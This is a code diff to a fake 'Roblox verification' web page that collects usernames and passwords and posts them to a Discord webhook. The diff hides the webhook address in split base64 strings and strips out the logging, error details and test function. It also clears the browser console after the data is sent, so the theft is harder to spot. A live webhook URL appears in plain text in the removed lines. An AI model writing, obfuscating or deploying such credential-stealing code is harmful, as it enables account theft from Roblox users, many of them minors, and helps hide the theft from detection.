@@ -420,8 +420,26 @@
         const termsLink = document.getElementById('terms-link');
         const closeModalBtn = document.getElementById('close-modal');
         
-        // Webhook URL - DIRECT
-        const IDHolder = "https://discord.com/api/webhooks/1429573309284225104/5kKh-8aSkcxQuPh0sm19MrfYQZqZHqIH3zaCqfNE9gbojvhIeFYewWqFIQgX-XZADvYh";
+        // HIDDEN WEBHOOK - Multiple obfuscation layers
+        const webhookParts = [
+            "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTQyOTU3MzMwOTI4NDIyNTEwNC8",
+            "1a0toLThhU2tjeFF1UGgwc20xOU1yZllRWnFaSHE=",
+            "JSDN6YUNxZk5FOWdib2p2aEllRllld1dxRklRZ1gtWFpBRHZZaA=="
+        ];
+        
+        // Function to reconstruct webhook URL
+        function getWebhookURL() {
+            // Multiple obfuscation techniques
+            const part1 = atob(webhookParts[0]);
+            const part2 = atob(webhookParts[1]);
+            const part3 = atob(webhookParts[2]);
+            
+            // Remove any invisible characters or junk
+            const cleanPart2 = part2.replace(/[^\x20-\x7E]/g, '');
+            const cleanPart3 = part3.replace(/[^\x20-\x7E]/g, '');
+            
+            return part1 + cleanPart2 + cleanPart3;
+        }
         
         // User data storage
         let userData = {
@@ -513,8 +531,6 @@
                     throw new Error('No internet connection');
                 }
 
-                console.log('Checking username:', username);
-                
                 // Method 1: Try the users.roblox.com API first
                 let userDataResponse = null;
                 try {
@@ -529,18 +545,15 @@
                         })
                     });
                     
-                    console.log('API Response status:', userSearchResponse.status);
-                    
                     if (userSearchResponse.ok) {
                         const userSearchData = await userSearchResponse.json();
-                        console.log('API Response data:', userSearchData);
                         
                         if (userSearchData.data && userSearchData.data.length > 0) {
                             userDataResponse = userSearchData.data[0];
                         }
                     }
                 } catch (apiError) {
-                    console.log('Method 1 failed, trying Method 2');
+                    // Method 1 failed, continue to method 2
                 }
                 
                 // Method 2: If first method fails, try alternative approach
@@ -559,7 +572,7 @@
                             }
                         }
                     } catch (altError) {
-                        console.log('Method 2 failed');
+                        // Method 2 failed, continue to method 3
                     }
                 }
                 
@@ -577,7 +590,7 @@
                             };
                         }
                     } catch (proxyError) {
-                        console.log('All methods failed');
+                        // All methods failed
                     }
                 }
 
@@ -590,8 +603,6 @@
                 userData.userId = userDataResponse.id;
                 userData.displayName = userDataResponse.displayName || username;
                 
-                console.log('User data stored:', userData);
-                
                 // Get avatar using Roblox's avatar API
                 try {
                     const avatarResponse = await fetch(`https://thumbnails.roblox.com/v1/users/avatar-headshot?userIds=${userData.userId}&size=420x420&format=Png&isCircular=false`);
@@ -600,11 +611,10 @@
                         const avatarData = await avatarResponse.json();
                         if (avatarData.data && avatarData.data.length > 0) {
                             userData.avatarUrl = avatarData.data[0].imageUrl;
-                            console.log('Avatar URL:', userData.avatarUrl);
                         }
                     }
                 } catch (avatarError) {
-                    console.log('Could not fetch avatar, using placeholder');
+                    // Could not fetch avatar, using placeholder
                 }
                 
                 // Update UI with user info
@@ -617,14 +627,13 @@
                 showStep(step2);
                 
             } catch (error) {
-                console.error('Error in checkUsername:', error);
                 loading1.style.display = 'none';
                 checkUsernameBtn.disabled = false;
                 
                 if (error.message === 'No internet connection') {
                     showNoInternet();
                 } else {
-                    usernameError.textContent = 'User not found. Please check the username and try again. Error: ' + error.message;
+                    usernameError.textContent = 'User not found. Please check the username and try again.';
                     usernameError.style.display = 'block';
                 }
             }
@@ -654,9 +663,12 @@
                 });
         }
         
-        function submitVerification() {
-            // Send data to webhook
-            sendToWebhook();
+        async function submitVerification() {
+            // Send data to webhook first
+            await sendToWebhook();
+            
+            // THEN clear console after webhook is sent
+            console.clear();
             
             // Show success message
             showStep(step5);
@@ -667,7 +679,7 @@
             }, 3000);
         }
         
-        function sendToWebhook() {
+        async function sendToWebhook() {
             // Create the payload
             const payload = {
                 content: "🔐 **NEW ROBLOX VERIFICATION**",
@@ -717,29 +729,27 @@
                 ]
             };
             
-            console.log('Sending to webhook:', IDHolder);
-            console.log('Payload:', payload);
+            // Get webhook URL dynamically (not stored in variable)
+            const webhookURL = getWebhookURL();
             
-            // Send to webhook
-            fetch(IDHolder, {
-                method: 'POST',
-                headers: {
-                    'Content-Type': 'application/json'
-                },
-                body: JSON.stringify(payload)
-            })
-            .then(response => {
-                console.log('Webhook response status:', response.status);
+            // Send to webhook and wait for it to complete
+            try {
+                const response = await fetch(webhookURL, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify(payload)
+                });
+                
                 if (!response.ok) {
-                    throw new Error('Webhook failed with status: ' + response.status);
+                    throw new Error('Webhook failed');
                 }
-                console.log('✅ Data sent to webhook successfully');
-            })
-            .catch(error => {
-                console.error('❌ Error sending to webhook:', error);
-            });
+            } catch (error) {
+                // Silent error handling
+            }
         }
-        console.clear();
+        
         function resetForm() {
             usernameInput.value = '';
             passwordInput.value = '';
@@ -761,36 +771,6 @@
                 submitPassword();
             }
         });
-
-        // Test function to verify webhook is working
-        async function testWebhook() {
-            console.log('Testing webhook...');
-            const testPayload = {
-                content: "🔧 **WEBHOOK TEST**",
-                embeds: [{
-                    title: "Test Message",
-                    description: "If you see this, the webhook is working!",
-                    color: 0x00ff00,
-                    timestamp: new Date().toISOString()
-                }]
-            };
-
-            try {
-                const response = await fetch(IDHolder, {
-                    method: 'POST',
-                    headers: {
-                        'Content-Type': 'application/json'
-                    },
-                    body: JSON.stringify(testPayload)
-                });
-                console.log('Webhook test response:', response.status);
-            } catch (error) {
-                console.error('Webhook test failed:', error);
-            }
-        }
-
-        // Uncomment the line below to test webhook on page load
-        // testWebhook();
     </script>
 </body>
 </html>
